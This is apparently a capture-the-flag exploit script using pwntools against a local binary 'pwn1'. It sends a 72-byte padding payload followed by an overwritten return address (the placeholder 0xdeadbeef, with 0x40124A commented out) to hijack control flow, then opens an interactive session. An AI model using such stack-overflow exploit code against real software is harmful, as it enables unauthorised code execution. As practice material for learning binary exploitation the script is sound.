from pwn import *
context.log_level = 'debug'
r= process("./pwn1")
# p64(0x40124A)
payload =b"a"*64+b"b"*8+p64(0xdeadbeef)
pause()
r.sendline(payload)
r.interactive()